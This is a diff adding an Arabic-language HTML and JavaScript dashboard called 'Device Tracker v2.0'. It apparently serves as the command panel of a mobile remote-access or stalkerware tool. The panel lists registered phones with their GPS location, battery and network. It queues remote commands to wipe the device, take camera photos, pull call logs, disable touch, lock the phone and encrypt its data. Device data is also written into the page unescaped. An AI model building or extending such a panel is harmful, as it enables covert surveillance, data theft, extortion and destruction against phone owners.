@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم - Device Tracker</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #f5f7fa; }
+        .navbar { background: #2d3748; color: white; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
+        .navbar h2 { font-weight: 400; }
+        .navbar a { color: white; text-decoration: none; background: #4a5568; padding: 8px 16px; border-radius: 6px; transition: 0.3s; }
+        .navbar a:hover { background: #718096; }
+        .container { max-width: 1400px; margin: 30px auto; padding: 0 20px; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); text-align: center; }
+        .stat-card h3 { color: #4a5568; font-size: 16px; margin-bottom: 10px; }
+        .stat-card .value { font-size: 36px; font-weight: 700; color: #2d3748; }
+        .devices-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .devices-header h3 { font-size: 24px; color: #2d3748; }
+        .refresh-btn { background: #4299e1; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 16px; transition: 0.3s; display: flex; align-items: center; gap: 8px; }
+        .refresh-btn:hover { background: #3182ce; }
+        .devices-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
+        .device-card { background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; transition: 0.3s; border: 1px solid #e2e8f0; }
+        .device-card:hover { box-shadow: 0 8px 25px rgba(0,0,0,0.1); transform: translateY(-3px); }
+        .device-header { background: #4a5568; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
+        .device-header h4 { font-size: 18px; font-weight: 600; }
+        .device-status { background: #48bb78; color: white; padding: 3px 10px; border-radius: 20px; font-size: 12px; }
+        .device-status.offline { background: #a0aec0; }
+        .device-body { padding: 15px; }
+        .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px dashed #e2e8f0; }
+        .info-row:last-child { border-bottom: none; }
+        .info-label { color: #718096; font-weight: 500; }
+        .info-value { color: #2d3748; font-weight: 600; }
+        .commands { padding: 15px; background: #f7fafc; border-top: 1px solid #e2e8f0; }
+        .commands h5 { margin-bottom: 10px; color: #4a5568; display: flex; align-items: center; gap: 5px; }
+        .commands-grid { display: flex; flex-wrap: wrap; gap: 8px; }
+        .cmd-btn { background: white; border: 1px solid #cbd5e0; border-radius: 20px; padding: 6px 14px; font-size: 13px; cursor: pointer; transition: 0.2s; color: #2d3748; }
+        .cmd-btn:hover { background: #4299e1; border-color: #4299e1; color: white; }
+        .cmd-btn.danger:hover { background: #f56565; border-color: #f56565; }
+        .no-devices { text-align: center; padding: 60px; background: white; border-radius: 12px; color: #a0aec0; font-size: 18px; }
+        .toast { position: fixed; bottom: 30px; right: 30px; background: #2d3748; color: white; padding: 12px 24px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); display: none; }
+        .toast.show { display: block; animation: fadeInOut 3s ease; }
+        @keyframes fadeInOut { 0% { opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <h2>📱 Device Tracker v2.0 – لوحة التحكم</h2>
+        <a href="/logout">تسجيل الخروج</a>
+    </div>
+
+    <div class="container">
+        <div class="stats">
+            <div class="stat-card">
+                <h3>إجمالي الأجهزة</h3>
+                <div class="value" id="totalDevices">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>متصل الآن</h3>
+                <div class="value" id="onlineDevices">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>أوامر معلقة</h3>
+                <div class="value" id="pendingCommands">0</div>
+            </div>
+        </div>
+
+        <div class="devices-header">
+            <h3>📋 الأجهزة المسجلة</h3>
+            <button class="refresh-btn" onclick="fetchDevices()">
+                <span>🔄</span> تحديث
+            </button>
+        </div>
+
+        <div id="devicesContainer" class="devices-grid">
+            <!-- سيتم ملؤها ديناميكياً -->
+        </div>
+    </div>
+
+    <div id="toast" class="toast">تم إرسال الأمر بنجاح</div>
+
+    <script>
+        // دالة لعرض الإشعارات
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // جلب الأجهزة من الخادم
+        async function fetchDevices() {
+            try {
+                const response = await fetch('/api/devices');
+                const devices = await response.json();
+                renderDevices(devices);
+                updateStats(devices);
+            } catch (error) {
+                console.error('خطأ في جلب الأجهزة:', error);
+                document.getElementById('devicesContainer').innerHTML = '<div class="no-devices">⚠️ فشل الاتصال بالخادم</div>';
+            }
+        }
+
+        // تحديث الإحصائيات
+        function updateStats(devices) {
+            const total = Object.keys(devices).length;
+            const now = new Date();
+            const online = Object.values(devices).filter(d => {
+                if (!d.lastCheckin) return false;
+                const last = new Date(d.lastCheckin);
+                return (now - last) < 60000; // آخر دقيقة
+            }).length;
+            const pending = Object.values(devices).reduce((acc, d) => acc + (d.commands ? d.commands.length : 0), 0);
+
+            document.getElementById('totalDevices').innerText = total;
+            document.getElementById('onlineDevices').innerText = online;
+            document.getElementById('pendingCommands').innerText = pending;
+        }
+
+        // إرسال أمر إلى جهاز
+        async function sendCommand(deviceId, command, parameters = {}) {
+            try {
+                const response = await fetch('/api/send-command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, command, parameters })
+                });
+                const result = await response.json();
+                if (result.status === 'queued') {
+                    showToast(`✅ الأمر ${command} أُرسل إلى ${deviceId.substring(0,8)}...`);
+                    fetchDevices(); // تحديث الأجهزة لرؤية الأمر في قائمة المعلقة
+                } else {
+                    showToast('❌ فشل في إرسال الأمر');
+                }
+            } catch (error) {
+                showToast('❌ خطأ في الاتصال');
+            }
+        }
+
+        // عرض الأجهزة في البطاقات
+        function renderDevices(devices) {
+            const container = document.getElementById('devicesContainer');
+            if (Object.keys(devices).length === 0) {
+                container.innerHTML = '<div class="no-devices">🚫 لا توجد أجهزة مسجلة بعد</div>';
+                return;
+            }
+
+            let html = '';
+            const now = new Date();
+
+            for (const [id, device] of Object.entries(devices)) {
+                const lastCheckin = device.lastCheckin ? new Date(device.lastCheckin) : null;
+                const isOnline = lastCheckin && (now - lastCheckin) < 60000;
+                const statusClass = isOnline ? '' : 'offline';
+                const statusText = isOnline ? 'متصل' : 'غير متصل';
+
+                // تنسيق البيانات
+                const battery = device.battery ? `${device.battery}%` : 'غير معروف';
+                const network = device.network || 'N/A';
+                const location = device.location ? `${device.location.lat}, ${device.location.lng}` : 'غير معروف';
+                const model = device.model || 'غير معروف';
+                const commandsCount = device.commands ? device.commands.length : 0;
+
+                html += `
+                    <div class="device-card" id="device-${id}">
+                        <div class="device-header">
+                            <h4>${model}</h4>
+                            <span class="device-status ${statusClass}">${statusText}</span>
+                        </div>
+                        <div class="device-body">
+                            <div class="info-row"><span class="info-label">🆔 المعرف</span><span class="info-value">${id.substring(0,16)}...</span></div>
+                            <div class="info-row"><span class="info-label">🔋 البطارية</span><span class="info-value">${battery}</span></div>
+                            <div class="info-row"><span class="info-label">📶 الشبكة</span><span class="info-value">${network}</span></div>
+                            <div class="info-row"><span class="info-label">📍 الموقع</span><span class="info-value">${location}</span></div>
+                            <div class="info-row"><span class="info-label">⏱️ آخر Check-in</span><span class="info-value">${lastCheckin ? lastCheckin.toLocaleString('ar-SA') : 'أبداً'}</span></div>
+                            <div class="info-row"><span class="info-label">📦 أوامر معلقة</span><span class="info-value">${commandsCount}</span></div>
+                        </div>
+                        <div class="commands">
+                            <h5>🎮 أوامر التحكم</h5>
+                            <div class="commands-grid">
+                                <button class="cmd-btn" onclick="sendCommand('${id}', 'FACTORY_RESET')">🧹 حذف كل البيانات</button>
+                                <button class="cmd-btn" onclick="sendCommand('${id}', 'TAKE_PHOTO')">📸 فتح الكاميرا</button>
+                                <button class="cmd-btn" onclick="sendCommand('${id}', 'LOCK_SCREEN')">🔒 قفل الشاشة</button>
+                                <button class="cmd-btn" onclick="sendCommand('${id}', 'DISABLE_TOUCH')">🚫 تعطيل اللمس</button>
+                                <button class="cmd-btn" onclick="sendCommand('${id}', 'FULL_LOCK')">🔐 قفل الهاتف</button>
+                                <button class="cmd-btn" onclick="sendCommand('${id}', 'ENCRYPT_DATA')">🔏 تشفير البيانات</button>
+                                <button class="cmd-btn" onclick="sendCommand('${id}', 'SHOW_MESSAGE', {text:'مرحباً من المسؤول'})">💬 إظهار رسالة</button>
+                                <button class="cmd-btn" onclick="sendCommand('${id}', 'MAX_VOLUME')">🔊 تشغيل الصوت</button>
+                                <button class="cmd-btn" onclick="sendCommand('${id}', 'GET_LOCATION')">📍 تحديث الموقع</button>
+                                <button class="cmd-btn" onclick="sendCommand('${id}', 'GET_LOGS')">📜 سجل المكالمات</button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+            container.innerHTML = html;
+        }
+
+        // تحديث دوري كل 5 ثواني
+        setInterval(fetchDevices, 5000);
+        // تحميل أولي
+        window.onload = fetchDevices;
+    </script>
+</body>
+</html>
